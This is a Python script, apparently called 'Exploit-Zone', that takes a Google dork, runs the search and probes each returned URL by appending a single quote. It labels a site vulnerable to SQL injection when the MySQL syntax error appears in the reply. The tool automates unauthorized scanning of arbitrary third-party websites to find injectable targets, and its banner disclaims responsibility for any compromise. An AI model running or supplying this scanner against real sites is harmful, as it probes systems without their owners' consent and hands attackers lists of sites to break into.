try:
	import urllib
	import urllib.request
	import requests
	from googlesearch import search
	import time
	import sys
	import os
except ImportError as ie:
	print(ie)
	print("You Didn't Run 'pip3 install -r requirements.txt'! Run It Now!!!")
	sys.exit()


os.system("clear")


print("___________              .__         .__  __            __________                    ")
print("\_   _____/__  _________ |  |   ____ |__|/  |_          \____    /____   ____   ____  ")
print(" |    __)_\  \/  /\____ \|  |  /  _ \|  \   __\  ______   /     //  _ \ /    \_/ __ \ ")
print(" |        \>    < |  |_> >  |_(  <_> )  ||  |   /_____/  /     /(  <_> )   |  \  ___/ ")
print("/_______  /__/\_ \|   __/|____/\____/|__||__|           /_______ \____/|___|  /\___  >")
print("        \/      \/|__|                                          \/          \/     \/ ")

print("""
 =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 #				User It Responsibly				    #
 #				Made By Antoine Zayat				    #
 #                              Github: hacker900123				    #
 #    		I Hold No Responsibility For Any Comprimisation Done By My Tool	    #
 =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
""")



dork = input("Enter Dork To Search: ")
amount = input("Enter Maximum Amount To Query: ")

urls = []

domain = ("https://www.google.com/search?q=")

try:
	for url in search(dork, stop=int(amount)):
		u = url.split()
		for i in u:
			print("[*] Possible Vulnerable Url")
			time.sleep(1)
			print(i)
			print("="*40)
			print("[*] Checking Url For Sqli Vulnerability")
			time.sleep(1)
			b = urllib.request.urlopen(i + "'")
			body = b.read()
			webbody = body.decode("ISO-8859-1")
			if("You have an error in your SQL syntax") in webbody:
				print("[+] " +i + " Is Vulnerable To Sql Injection Vulnerability")
				print("+"*40)
			else:
				print("[*] " + i + " Is Not Vulnerable To Sql Injection Vulnerability")
				print("-"*40)
except Exception as E:
	print(E)
	print("[!] The Script Has Encountered A Problem")
	sys.exit()
